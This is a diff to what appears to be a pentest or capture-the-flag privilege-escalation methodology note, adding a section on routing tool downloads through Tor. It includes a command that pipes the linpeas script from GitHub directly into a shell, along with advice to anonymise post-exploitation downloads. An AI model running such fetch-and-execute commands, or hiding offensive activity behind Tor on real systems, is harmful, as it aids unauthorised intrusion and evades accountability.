@@ -29,7 +29,15 @@ Keywords: privesc, root, SYSTEM, sudo, SUID, linpeas, winpeas, GTFOBins
 3. Use GTFOBins for Linux privesc
 4. Document in room report
 
+## Tor / Anonymization
+- Privilege escalation is mostly LOCAL — no external network calls needed
+- If downloading linpeas.sh or other tools from GitHub, use Tor:
+  - `proxychains curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`
+- Post-exploitation: if uploading tools to target, use Tor for the download from attacker machine
+- Verify Tor: `ss -tlnp | grep 9050`
+  
 ## Notes
 - Document all findings in room report.txt
 - Follow PTES methodology
 - Always check sudo -l first on Linux
+- Download external tools through Tor; local checks are direct
